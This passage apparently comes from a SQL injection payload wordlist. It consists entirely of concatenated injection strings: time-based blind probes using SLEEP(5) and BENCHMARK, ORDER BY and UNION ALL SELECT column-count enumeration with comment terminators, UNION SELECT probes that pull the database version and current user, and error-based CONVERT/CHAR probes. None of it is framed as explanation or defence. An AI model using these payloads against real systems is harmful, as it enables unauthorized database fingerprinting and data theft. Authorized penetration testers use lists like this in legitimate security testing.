1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#ORDER BY SLEEP(5)-- ORDER BY 1,SLEEP(5)-- ORDER BY 1,SLEEP(5),3-- ORDER BY 1,SLEEP(5),3,4-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 1UNION ALL SELECT 1,2UNION ALL SELECT 1,2,3UNION ALL SELECT 1,2,3,4UNION ALL SELECT 1,2,3,4,5UNION ALL SELECT 1,2,3,4,5,6UNION ALL SELECT 1,2,3,4,5,6,7UNION ALL SELECT 1,2,3,4,5,6,7,8UNION ALL SELECT 1,2,3,4,5,6,7,8,9UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30UNION ALL SELECT 1#UNION ALL SELECT 1,2#UNION ALL SELECT 1,2,3#UNION ALL SELECT 1,2,3,4#UNION ALL SELECT 1,2,3,4,5#UNION ALL SELECT 1,2,3,4,5,6#UNION ALL SELECT 1,2,3,4,5,6,7#UNION ALL SELECT 1,2,3,4,5,6,7,8#UNION ALL SELECT 1,2,3,4,5,6,7,8,9#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#UNION ALL SELECT 1-- UNION ALL SELECT 1,2-- UNION ALL SELECT 1,2,3-- UNION ALL SELECT 1,2,3,4-- UNION ALL SELECT 1,2,3,4,5-- UNION ALL SELECT 1,2,3,4,5,6-- UNION ALL SELECT 1,2,3,4,5,6,7-- UNION ALL SELECT 1,2,3,4,5,6,7,8-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION SELECT @@VERSION,SLEEP(5),3UNION SELECT @@VERSION,SLEEP(5),USER(),4UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30UNION SELECT @@VERSION,SLEEP(5),&quot;&#x27;3UNION SELECT @@VERSION,SLEEP(5),&quot;&#x27;3&#x27;&quot;#UNION SELECT @@VERSION,SLEEP(5),USER(),4#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#UNION ALL SELECT USER()-- UNION ALL SELECT SLEEP(5)-- UNION ALL SELECT USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;))-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT NULL-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION 